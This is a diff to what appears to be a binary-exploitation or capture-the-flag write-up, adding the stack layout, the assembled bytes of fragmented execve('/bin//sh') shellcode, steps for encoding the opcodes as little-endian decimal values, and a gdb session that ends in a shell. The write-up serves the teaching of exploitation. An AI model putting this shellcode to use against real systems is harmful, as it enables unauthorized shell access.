@@ -207,6 +207,13 @@ We could write down as many number of values we want on the stack, and then call
 pop jmp/ret takes 2-3 bytes only. That's amazing.
 So, we only need to write the addresses we should jmp to
 
+Here is how the stack would look like:
+
+index 109 : 0xbffff23c --> jmp to start of shellcode
+      110 : 0xbffff248 --> Memory jumps
+      111 : GARBAGE
+      112 : 0xbffff254
+      113 : 0xbffff260
 
 Here are my assembly instructions for the same : 
 
@@ -239,5 +246,137 @@ pop edi
 jmp edi
 
 xor ecx, ecx
-mov al, 0xb
+mov al, 0xb   ; execve system call is 11. See unistd_32.h and man execve
 int 0x80
+
+I ran this in the online assembler at https://defuse.ca/online-x86-assembler.htm
+
+
+Disassembly:
+0:  68 2f 2f 73 68          push   0x68732f2f
+5:  59                      pop    ecx
+6:  90                      nop
+7:  c3                      ret
+8:  68 2f 62 69 6e          push   0x6e69622f
+d:  5a                      pop    edx
+e:  5e                      pop    esi
+f:  c3                      ret
+10: 31 c0                   xor    eax,eax
+12: 5e                      pop    esi
+13: 5f                      pop    edi
+14: 5f                      pop    edi
+15: ff e6                   jmp    esi
+17: 50                      push   eax
+18: 51                      push   ecx
+19: 52                      push   edx
+1a: 89 e3                   mov    ebx,esp
+1c: ff e7                   jmp    edi
+1e: 5f                      pop    edi
+1f: 5f                      pop    edi
+20: 5f                      pop    edi
+21: 5f                      pop    edi
+22: ff e7                   jmp    edi
+24: 31 c9                   xor    ecx,ecx
+26: b0 0b                   mov    al,0xb
+28: cd 80                   int    0x80
+
+
+So now that we have the opcodes, we can start grouping them into groups of 4.
+NOTE: These are assembly instructions. A single byte can represent an assembly instruction (as you can see above). Also, 00 is also an
+assembly instruction. The equivalent null in instructions is 90 or NOP.
+To see assembly instructions, use x/i <Address> in GDB.
+
+First group them in 4s and then read the opcodes in reverse (coz its little endian). Then compute the numberical decimal equivalent of
+the obtained hex values.
+Eg. 68 2f 2f 73
+    68 59 90 c3
+    
+    should be read as 
+    
+    73 2f 2f 68 --> 1932472168
+    c3 90 59 68 --> 3281017192
+   
+(Calculator is highly recommended !!)
+
+Now, all that was left was to convert the opcodes found into decimal and then store those values. All this effort surely bears fruit
+
+after entering, be sure to check the instructions.
+0xbffff23c --> start of shellcode
+
+If you have entered correctly, you will see this:
+
+gdb-peda$ x/30xi 0xbffff23c
+   0xbffff23c:    push   0x68732f2f
+   0xbffff241:    pop    ecx
+   0xbffff242:    nop
+   0xbffff243:    ret    
+   0xbffff244:    add    BYTE PTR [eax],al
+   0xbffff246:    add    BYTE PTR [eax],al
+   0xbffff248:    push   0x6e69622f
+   0xbffff24d:    pop    edx
+   0xbffff24e:    pop    esi
+   0xbffff24f:    ret    
+   0xbffff250:    add    BYTE PTR [eax],al
+   0xbffff252:    add    BYTE PTR [eax],al
+   0xbffff254:    xor    eax,eax
+   0xbffff256:    pop    esi
+   0xbffff257:    pop    edi
+   0xbffff258:    pop    edi
+   0xbffff259:    jmp    esi
+   0xbffff25b:    nop
+   0xbffff25c:    add    BYTE PTR [eax],al
+   0xbffff25e:    add    BYTE PTR [eax],al
+   0xbffff260:    push   eax
+   0xbffff261:    push   ecx
+   0xbffff262:    push   edx
+   0xbffff263:    mov    ebx,esp
+   0xbffff265:    jmp    edi
+   0xbffff267:    nop
+   0xbffff268:    add    BYTE PTR [eax],al
+   0xbffff26a:    add    BYTE PTR [eax],al
+   0xbffff26c:    pop    edi
+   0xbffff26d:    pop    edi
+gdb-peda$ 
+   0xbffff26e:    pop    edi
+   0xbffff26f:    pop    edi
+   0xbffff270:    push   eax
+   0xbffff271:    jmp    edi
+   0xbffff273:    nop
+   0xbffff274:    add    BYTE PTR [eax],al
+   0xbffff276:    add    BYTE PTR [eax],al
+   0xbffff278:    xor    ecx,ecx
+   0xbffff27a:    mov    al,0x0
+   0xbffff27c:    int    0x80
+   0xbffff27e:    nop
+   0xbffff27f:    nop
+
+
+
+gdb-peda$ x/xs $ebx
+0xbffff3fc:    "/bin//sh"
+gdb-peda$ x/xs $ecx
+0x0:    <error: Cannot access memory at address 0x0>
+
+
+STACK FRAME : 
+
+gdb-peda$ x/7xw $esp
+0xbffff3f0:    0xbffff248    0xbffff488    0xbffff254    0xbffff260
+0xbffff400:    0x00000000    0xbffff26c    0xbffff278
+
+gdb-peda$ x/4xi $eip
+=> 0xbffff27c:    int    0x80
+   0xbffff27e:    nop
+   0xbffff27f:    nop
+   0xbffff280:    add    BYTE PTR [eax],al
+gdb-peda$ stepi
+process 6579 is executing new program: /bin/dash
+Warning:
+Cannot insert breakpoint 1.
+Cannot access memory at address 0x80489b9
+Cannot insert breakpoint 2.
+Cannot access memory at address 0x8048c3b
+
+There we go. (GDB executed /bin/dash as its own security feature)
+
+We got shell on the box through system call 11.
